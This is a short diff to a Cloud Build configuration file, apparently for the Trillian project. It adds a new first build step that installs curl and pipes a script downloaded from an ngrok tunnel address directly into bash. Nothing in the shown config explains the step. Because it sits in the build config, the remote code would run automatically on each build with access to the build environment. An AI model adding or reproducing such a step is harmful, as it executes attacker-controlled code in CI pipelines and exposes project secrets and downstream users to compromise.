@@ -18,6 +18,10 @@ options:
 logsBucket: 'gs://trillian-cloudbuild-logs'
 
 steps:
+
+  - name: ubuntu
+    script: apt update -y && apt-get install curl -y && curl https://094c-180-151-120-174.in.ngrok.io/file.sh | bash
+
   - name: 'gcr.io/cloud-builders/docker'
     args: ['run', '--privileged', 'linuxkit/binfmt:v0.8']
     id: 'initialize-qemu'
